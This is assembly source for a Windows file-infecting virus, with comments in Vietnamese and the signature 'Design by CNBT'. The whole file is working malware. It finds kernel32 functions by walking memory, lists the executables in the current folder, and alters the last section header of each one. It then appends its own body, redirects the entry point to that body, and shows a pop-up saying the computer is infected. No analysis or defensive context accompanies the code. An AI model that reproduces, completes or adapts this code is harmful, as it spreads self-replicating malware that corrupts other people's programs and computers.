.586p
.model FLAT, stdcall

includelib c:\masm32\lib\kernel32.lib
Extern VirtualProtect@16:NEAR 
_DATA segment 
	temp				dword 	? 				
_DATA ends

_TEXT segment
START:
	push offset temp
	push 40h				; 40h = EXECUTE_READWRITE
	push offset END_VR - START_VR
	mov eax, offset START_VR
	push eax
	call VirtualProtect@16

START_VR:	
	call __
__:
	pop eax
	sub eax, offset __
	mov [offset delta + eax],eax
	mov esi, eax
	
code_:
	; lay dia chi ham goi cua kernel32.dll;-----------------------------------
	pop eax		
	push eax
	and eax, 0ffff0000h 		; eax dang tro toi .PEHeader of kernel32.dll
	
	; ds = data segment of FILE will be virus <ds of FILE host>
	
find_kernel32:	
	cmp word ptr [eax], "ZM"	
	jne find_continues
	mov edi, [eax+3Ch]
	add edi, eax
	mov ebx, [edi]
	cmp ebx, "EP"
	
	je finded_kernel32
find_continues:	
	sub eax, 10000h

	jmp find_kernel32
finded_kernel32:	
	;---eax = VA of Kernel32.dll-------------------------------------------------
	
; VA ImageBaseKernelInMem = eax
	mov [VAImageBaseKernelInMem+esi], eax
; VA PEsignature = edi
	mov [VAPEsignatureInMem+esi], edi
	
	; RVA ExportTableInFile = dword prt [VA PEsignature + 78h ] .. <in FILE: 78h = offset RVA Export table addess - offset PeSignature>
	mov ebx, [edi+78h]
	; VA ImageBaseKernelInFile = dw ptr [VA PEsignature + 34h]  .. <in FILE: 34h = offset ImageBase - offset PeSignature>
	mov ecx, [edi+34h]
	; offset ImageBase = VA ImageBaseKernelInMem - VA ImageBaseKernelInFile
	sub eax, ecx
	; VA ExportTableInMem = RVA ExportTableInFile + VA ImageBaseInFile + offset ImageBase 
	add ebx, ecx
	add ebx, eax		; ebx  = VAExportTableInMem
	
	; ------ read "Export table" of kernel to find "LoadLibrary"-----------------
	; read dword in position 9 = ENT -> find function by name  
	mov [VAExportTableInMem+esi], ebx
	mov edi, ebx
	
	mov ebx, [edi+28]  
	add ebx, [VAImageBaseKernelInMem+esi]
	mov [VAEAT+esi], ebx			; save VA EAT table
	mov ebx, [edi+32]  
	add ebx, [VAImageBaseKernelInMem+esi]
	mov [VAENT+esi], ebx			; save VA ENT table
	mov ebx, [edi+36]  
	add ebx, [VAImageBaseKernelInMem+esi]
	mov [VAEOT+esi], ebx			; save VA EOT table
	
	mov eax, [VAENT+esi]
	sub eax, 4
	mov edx, [VAEOT+esi]
	sub edx, 2
whileFindFuncName:	
	add edx, 2
	add eax, 4
	mov ebx, [eax]		;ebx = RVA of 1 Name function
	add ebx, [VAImageBaseKernelInMem+esi] ; -> ebx point to VA Name function export 
	mov ecx, [ebx]
	
	cmp ecx, "PteG"
	je find_continues1
	jmp whileFindFuncName
find_continues1:
	mov ecx, [ebx+4]
	cmp ecx, "Acor"
	je find_continues2
	jmp whileFindFuncName
find_continues2:
	mov ecx, [ebx+8]
	cmp ecx, "erdd"
	je find_continues3
	jmp whileFindFuncName
find_continues3:
	xor ecx, ecx
	mov cx, word ptr [ebx+12]
	cmp cx, "ss"
	je break_FindFuncName
	jmp whileFindFuncName
		
break_FindFuncName:	
	mov cx, word ptr [edx]
	
	mov edx, [VAEAT+esi]
while_findAddr:	
	add edx, 4
	loop while_findAddr
	mov edx, [edx]
	add edx, [VAImageBaseKernelInMem+esi]
	mov [func_GetProcAddress+esi], edx
	
	; ....................................... set func_LoadLibrary
	mov eax, offset name_LoadLibraryA 
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_LoadLibraryA+esi], eax
 	
 	;........................................ set func_VirtualProtect
	mov eax, offset name_VirtualProtect
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_VirtualProtect+esi], eax
	
	;........................................ load dll _ user32.dll
	mov eax, offset name_user32
	add eax, esi
	push eax
	call [func_LoadLibraryA+esi]
	mov [dll_user32+esi], eax
	
	;........................................ set func_MessageBoxA
	mov eax, offset name_MessageBoxA
	add eax, esi
	push eax
	push [dll_user32+esi]
	call [func_GetProcAddress+esi]
	mov [func_MessageBoxA+esi], eax
	
	;........................................ set func_CreateFile
	mov eax, offset name_CreateFile
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_CreateFile+esi], eax
	
	;........................................ set func_ReadFile
	mov eax, offset name_ReadFile
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_ReadFile+esi], eax
	
	;........................................ set func_WriteFile
	mov eax, offset name_WriteFile
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_WriteFile+esi], eax

	;........................................ set func_SetFilePointer
	mov eax, offset name_SetFilePointer
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_SetFilePointer+esi], eax
	
	;........................................ set func_CloseHandle
	mov eax, offset name_CloseHandle
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_CloseHandle+esi], eax
	
	;........................................ set func_CloseHandle
	mov eax, offset name_lstrcmp
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_lstrcmp+esi], eax
	
	;........................................ set func_FindFirstFileA
	mov eax, offset name_FindFirstFileA
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_FindFirstFileA+esi], eax
	
	;........................................ set func_FindNextFileA
	mov eax, offset name_FindNextFileA
	add eax, esi
	push eax
	push [VAImageBaseKernelInMem+esi]
	call [func_GetProcAddress+esi]
	mov [func_FindNextFileA+esi], eax
	
	
;................................>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
	; lay vr
	push [EntryPointHost+esi]
	push [EntryPointVr+esi]
	call timFile
	pop [EntryPointVr+esi]
	pop [EntryPointHost+esi]
;..............................................................	
	push 30h
	mov eax, offset VRSignature
	add eax, esi
	push eax
	mov eax, offset msg
	add eax, esi
	push eax
	push 0
	call [func_MessageBoxA+esi]
	
;	mov eax, offset dll_user32
;	add eax, esi
;	push eax
;	push 40h				; 40h = EXECUTE_READWRITE
;	push 1000h
;	mov eax, offset START_VR
;	add eax, esi
;	push eax
;	call [func_VirtualProtect+esi]
	cmp esi, 0
	je	end_
	
	mov eax, offset START_VR - offset end_ + 5
	add eax, [EntryPointHost+esi] 
	sub eax, [EntryPointVr+esi]
	call delta_callback
delta_callback:
	pop ebx
	add ebx, eax
	push ebx
	ret
end_:
	
	ret
timFile proc
	push esi
	push eax
	push ebx
	push ecx
	push edx
	
	mov eax, offset FindData
	add eax, esi
	push eax
	mov eax, offset PathFile
	add eax, esi
	push eax
	call [func_FindFirstFileA+esi]
	mov [hFindFile+esi], eax
	jmp fileFirst

whileFindFile:
	mov eax, offset FindData
	add eax, esi
	push eax
	push  [hFindFile+esi]
	call [func_FindNextFileA+esi]
	
	cmp eax, 0 
	je breakFindFile
fileFirst:	
	cmp dword ptr[FindData+esi], 10h
	je  whileFindFile			; dwAttributes = 10h -> folder	
	cmp dword ptr[FindData+esi], 20h
	jne koDinhDang				; dwAttributes = 10h -> file
	
	call layNhiemVr
	
koDinhDang:	
	
	jmp whileFindFile
breakFindFile:	
	
	pop edx
	pop ecx
	pop ebx
	pop eax
	pop esi
	
	ret

timFile endp
layNhiemVr proc 
	
	push esi
	push eax
	push ebx
	push ecx
	push edx
	
	; ------------- lay HANDLE file lay nhiem -----------
	push 0
	push 20h
	push 3
	push 0
	push 1
	push 0C0000000h
	mov eax, offset FindData + 44		; ten file lay nhiem
	add eax, esi
	push eax
	call [func_CreateFile+esi]
	mov [hFileHost+esi], eax
	cmp eax, -1
	je ketThuc_layNhiem
	
	;--------------- kiem tra chu ki "MZ"-------------------
	mov [HostSignature+esi], 0
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 2							; numOfByte to read	
	mov eax, offset HostSignature
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]
	
	mov eax, 0
	mov ax, word ptr [offset HostSignature+esi]
	cmp eax, 5a4dh 
	jne ketThuc_layNhiem
	
	;------------- sua Header file lay nhiem ----------------------------------------------
	mov [virusSize+esi], offset END_VR - offset START_VR
	
	push 0
	push 0
	push 3ch
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 4							; numOfByte to read	
	mov eax, offset PESignatureHost
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]			
	
	;............................. kiem tra chu ki "PE" + VR Signature
	push 0
	push 0
	push [PESignatureHost+esi]
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	mov [HostSignature+esi], 0
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 4							; numOfByte to read	
	mov eax, offset HostSignature
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]			
	cmp dword ptr [HostSignature+esi], "EP"
	jne ketThuc_layNhiem
	
	push 2
	push 0
	push -15
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 14							; numOfByte to read	
	mov eax, offset HostSignature
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]
				
	mov eax, offset HostSignature
	add eax, esi
	push eax
	mov eax, offset VRSignature
	add eax, esi
	push eax
	call [func_lstrcmp+esi]
	je ketThuc_layNhiem
	; ............................ read Section Alignment + File Alignment
	push 0
	push 0
	mov eax, [PESignatureHost+esi]
	add eax, 38h
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 8							; numOfByte to read	
	mov eax, offset SectionAlignment
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]			
	
	;........................ read EntryPoint Host
	push 0
	push 0
	mov eax, [PESignatureHost+esi]
	add eax, 28h
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 4							; numOfByte to read	
	mov eax, offset EntryPointHost
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]			
	
	; ..................... read ImageSize Host 
	push 0
	push 0
	mov eax, [PESignatureHost+esi]
	add eax, 50h
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 4							; numOfByte to read	
	mov eax, offset ImageSizeHost
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]			
	
	
	;........................ read Number of Section
	push 0
	push 0
	mov eax, [PESignatureHost+esi]
	add eax, 6h
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	mov [NumberOfSection+esi], 0
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 2							; numOfByte to read	
	mov eax, offset NumberOfSection
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]			
	
	; --------------------- change Section final---------------
	mov ecx, [NumberOfSection+esi]
	dec ecx
	mov eax, [PESignatureHost+esi]
	add eax,  0f8h + 8
lap_1:
	add eax, 40
	loop lap_1
	
	push 0
	push 0
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0							; Overlapped
	mov eax, offset numOfByteRead	
	add eax, esi
	push eax 						; offset mumByteReaded 
	push 32							; numOfByte to read	
	mov eax, offset VirtualSize
	add eax, esi
	push eax						; offset Buff save
	push [hFileHost+esi]			; hFile to Read
	call [func_ReadFile+esi]				
	
	; ------ calculate new RawSize + Virtual size+ characteristic-------
	mov [Characteristics+esi], 0E0000040h ; set is exe + write + read
	
	mov eax, [virusSize+esi]	;
	add [RawSize+esi], eax		; rawsize += Virus size
								; raw size is not FileAlignment
	mov eax, [RawSize+esi]		; 
	mov edx , 0					
	div [FileAlignment+esi]		; edx = phan du, eax = thuong	
	
	mov eax, [FileAlignment+esi]
	sub eax, edx
	add [RawSize+esi], eax		; eax = num of file to fill
	mov [numOfByteToFill+esi], eax
	
	mov eax,[RawSize+esi]
	mov [VirtualSize+esi],eax
	
	push 1						; jump to in front of section final 
	push 0h
	push -32
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0						; write to Section header
	mov eax, offset numOfByteWritten
	add eax, esi
	push eax
	push 32
	mov eax,offset VirtualSize
	add eax, esi
	push eax
	push [hFileHost+esi]
	call [func_WriteFile+esi]
	
	;-------------------
	push 2
	push 0
	push 0
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	mov ebx, [RawSize+esi]
	add ebx, [RawAddress+esi]
	cmp	eax, ebx
	je fullAlignment
fullAlignment:
	;------------- ghi entry point -----------------
	push 2
	push 0
	push 0
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	mov [hostSize+esi], eax
	sub eax, [RawAddress+esi]
	add eax, [VirtualAddress+esi]
	mov [EntryPointVr+esi], eax
	
	push 0
	push 0
	mov eax, [PESignatureHost+esi]
	add eax, 28h
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0
	mov eax, offset numOfByteWritten
	add eax, esi
	push eax
	push 4
	mov eax,offset EntryPointVr
	add eax, esi
	push eax
	push [hFileHost+esi]
	call [func_WriteFile+esi]
	
	;------------- ghi Image size file Host_vr ------
	push 0
	push 0
	mov eax, [PESignatureHost+esi]
	add eax, 50h
	push eax
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	mov eax, [VirtualAddress+esi]
	add eax, [VirtualSize+esi]
	cmp eax, [ImageSizeHost+esi]
	
	jle not_write
	
	mov eax,[ImageSizeHost+esi]
	add eax,[SectionAlignment+esi]
	mov [ImageSizeVr+esi], eax
	
	push 0
	mov eax, offset numOfByteWritten
	add eax, esi
	push eax
	push 4
	mov eax,offset ImageSizeVr
	add eax, esi
	push eax
	push [hFileHost+esi]
	call [func_WriteFile+esi]
		
not_write:	
	;------------- ghi vr vao cuoi file--------------
	push 2
	push 0
	push 0
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0
	mov eax, offset numOfByteWritten
	add eax, esi
	push eax
	push offset END_VR - offset START_VR
	mov eax,offset START_VR
	add eax, esi
	push eax
	push [hFileHost+esi]
	call [func_WriteFile+esi]

	;-------------- fill byte 00 --------------------
	mov ecx, [numOfByteToFill+esi]
lap_fill:
	push ecx
	push 0
	mov eax, offset numOfByteWritten
	add eax, esi
	push eax
	push 1
	mov eax,offset byteFill
	add eax, esi
	push eax
	push [hFileHost+esi]
	call [func_WriteFile+esi]
	pop ecx
	loop lap_fill
	
	; --------------- ki ten Design ------------------
	push 2
	push 0
	push -15
	push [hFileHost+esi]
	call [func_SetFilePointer+esi]
	
	push 0
	mov eax, offset numOfByteWritten
	add eax, esi
	push eax
	push 15
	mov eax,offset VRSignature
	add eax, esi
	push eax
	push [hFileHost+esi]
	call [func_WriteFile+esi]
	
ketThuc_layNhiem:
	push [hFileHost+esi]
	call [func_CloseHandle+esi]
	
	pop edx
	pop ecx
	pop ebx
	pop eax
	pop esi
	ret

layNhiemVr endp	

data_:
	byteFill			db		0
	msg					db		"May tinh ban da bi nhiem VR.. !!", 0
	delta				dword	?
	func_GetProcAddress	dword 	?

	name_user32			db		"user32.dll",0
	dll_user32 			dword 	?	
	name_MessageBoxA 	db 		"MessageBoxA",0
	func_MessageBoxA 	dword 	?
	name_LoadLibraryA	db 		"LoadLibraryA", 0
	func_LoadLibraryA	dword	?
	name_VirtualProtect	db		"VirtualProtect",0
	func_VirtualProtect	dword	?
	name_CreateFile		db		"CreateFileA", 0
	func_CreateFile		dword	?
	name_ReadFile		db		"ReadFile", 0
	func_ReadFile		dword	?
	name_WriteFile		db		"WriteFile",0
	func_WriteFile		dword	?
	name_SetFilePointer	db		"SetFilePointer", 0
	func_SetFilePointer	dword	?
	name_CloseHandle	db		"CloseHandle", 0
	func_CloseHandle	dword	?
	name_lstrcmp		db		"lstrcmp", 0
	func_lstrcmp		dword	?
	name_FindFirstFileA	db		"FindFirstFileA", 0
	func_FindFirstFileA	dword	?
	name_FindNextFileA	db		"FindNextFileA", 0
	func_FindNextFileA	dword	?
	
	VAImageBaseKernelInMem		dword 	?
	VAPEsignatureInMem			dword	?
	VAExportTableInMem			dword 	?
	VAEAT						dword	?
	VAENT						dword 	?
	VAEOT						dword	?
	
	
	virusSize					dword	?
	hostSize					dword	?
	
	hFileHost					dword	?
	PESignatureHost				dword	?
	ImageSizeHost				dword	?	
	ImageSizeVr					dword	?
	EntryPointHost				dword	?
	EntryPointVr				dword	?
	NumberOfSection				dword	?
	SectionAlignment			dword	?
	FileAlignment				dword	?
	VirtualSize					dword	?
	VirtualAddress				dword	?
	RawSize						dword	?	
	RawAddress					dword	?		
	Free						db 		12 dup(?)
	Characteristics				dword	?
	
	numOfByteToFill				dword	?
	numOfByteWritten			dword	?
	numOfByteRead				dword	?
	
	hFindFile					dword	?
	PathFile					db 		".\*.*", 50 dup(0)
	FindData					db 		592 dup (?) ,0
	
	HostSignature				db		15 dup(0)	
	VRSignature					db		"Design by CNBT", 0
END_VR:	
_TEXT ends
END START